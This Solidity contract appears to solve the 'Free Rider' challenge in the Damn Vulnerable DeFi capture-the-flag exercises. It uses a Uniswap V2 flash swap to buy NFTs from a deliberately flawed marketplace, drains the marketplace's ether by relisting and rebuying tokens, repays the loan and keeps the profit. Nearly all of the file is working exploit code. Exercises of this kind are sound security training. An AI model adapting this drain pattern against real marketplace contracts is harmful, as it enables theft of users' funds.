// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IERC20.sol";

import "../DamnValuableNFT.sol";
import "./FreeRiderNFTMarketplace.sol";
import "hardhat/console.sol";

interface IUniswapV2Callee {
  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract PwnFreeRider is IUniswapV2Callee, IERC721Receiver {
    using Address for address payable;

    FreeRiderNFTMarketplace private _market;
    address private _uniswapPairAddress;
    address private _uniswapFactory;
    address private _partner;
    DamnValuableNFT private _nft;
    address payable _us;
    constructor(
	address payable marketAddress,
	address uniswapPairAddress,
	address uniswapFactoryAddress,
	address partnerAddress,
	address payable nftAddress,
	address payable ourAddress
	) public {
	_market = FreeRiderNFTMarketplace(marketAddress);
	_uniswapPairAddress = uniswapPairAddress;
	_uniswapFactory = uniswapFactoryAddress;
	_partner = partnerAddress;
	_nft = DamnValuableNFT(nftAddress);
	_us = ourAddress;
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
	address token0 = IUniswapV2Pair(msg.sender).token0();
	address token1 = IUniswapV2Pair(msg.sender).token1();
	IWETH weth = IWETH(token0);
	assert(msg.sender == IUniswapV2Factory(_uniswapFactory).getPair(token0, token1));
	assert(amount0 != 0 && amount1 == 0);
	IERC20(token0).approve(token0, amount0);
	weth.withdraw(amount0);

	// get tokens
	uint256[] memory buyTokens = new uint256[](6);
	for (uint i = 0; i < 6; i++) {
	    buyTokens[i] = i;
	}
	_market.buyMany{value: 15 ether}(buyTokens);

	// drain market ether
	uint256[] memory sellTokens = new uint256[](2);
	uint256[] memory sellPrices = new uint256[](2);
	for (uint i = 0; i < 2; i++ ) {
	    sellTokens[i] = i;
	    sellPrices[i] = 15 ether;
	}
	_nft.setApprovalForAll(address(_market), true);
	_market.offerMany(sellTokens, sellPrices);
	_market.buyMany{value: 15 ether}(sellTokens);

	// give NFTs to buyer
	for (uint i = 0; i < 6; i++) {
	    _nft.safeTransferFrom(address(this), _partner, i);
	}

	// pay off flashloan
	uint fee = ((amount0 * 3) / 997) + 1;
	uint amountToRepay = amount0 + fee;
	weth.deposit{value: amountToRepay}();
	IERC20(token0).transfer(_uniswapPairAddress, amountToRepay);

	// give ourselves teh monies
	_us.sendValue(address(this).balance);

    }

    function pwn(uint amount0Out, uint amount1Out) external {
	IUniswapV2Pair(_uniswapPairAddress).swap(amount0Out, amount1Out, address(this), "0x00");
    }

    function onERC721Received(address, address, uint256, bytes calldata) override public returns(bytes4) {
	return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
